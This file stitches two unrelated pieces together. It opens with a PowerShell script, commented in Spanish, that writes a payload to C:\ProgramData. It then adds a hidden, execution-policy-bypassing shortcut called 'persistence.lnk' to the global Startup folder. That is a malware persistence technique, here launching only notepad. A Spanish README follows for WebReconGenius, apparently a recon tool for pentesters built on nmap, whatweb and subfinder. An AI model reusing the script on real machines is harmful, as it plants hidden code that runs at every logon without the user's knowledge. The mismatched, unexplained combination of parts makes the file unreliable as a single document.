
$payload = 'Start-Process notepad.exe'
$payloadPath = "C:\ProgramData\payload.ps1"

# Guardar el script en ProgramData (visible a todos)
Set-Content -Path $payloadPath -Value $payload

# Crear acceso directo en Startup global
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\persistence.lnk")

$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`""
$Shortcut.Save()


# WebReconGenius
 WebReconGenius - Plataforma de Reconocimiento Web


**WebReconGenius** es una herramienta local de reconocimiento web todo-en-uno desarrollada para **pentesters**, **bug bounty hunters** y profesionales de **ciberseguridad ofensiva**.

Con solo ingresar un dominio, ejecuta múltiples procesos de recolección de información y presenta los resultados en una **interfaz**, con tarjetas organizadas, visualizaciones gráficas y análisis resumido.

---

## 🚀 Características

- 🌐 Resolución de IP del dominio
- 🔎 Escaneo de puertos y servicios con Nmap
- 🧠 Detección de tecnologías con WhatWeb
- 🌍 Enumeración de subdominios usando Subfinder
- 📦 Búsqueda de archivos de respaldo comunes (ej. `.zip`, `.sql`, `.tar.gz`)
- 🛡️ Detección de WAF y formularios de login
- 📥 Análisis de encabezados HTTP
- 📊 Dashboard visual estilo carrusel con gráficas interactivas (Chart.js)
- 📝 Generación de reportes en formato HTML y Markdown
- 💻 Interfaz local accesible desde navegador

---

## Requisitos

- **Python 3.8+**
- Herramientas externas instaladas:
  - [`nmap`](https://nmap.org/)
  - [`whatweb`](https://github.com/urbanadventurer/WhatWeb)
  - [`subfinder`](https://github.com/projectdiscovery/subfinder)
- Librerías de Python:
  ```bash
  pip install flask httpx beautifulsoup4


  ## INSTALACION Y USO

 ```bash

git clone https://github.com/Stealthy-lab/WebReconGenius
cd WebReconGenius
python3 app.py
Accede en tu navegador e ingresa http://localhost:5000
Ingresa un dominio
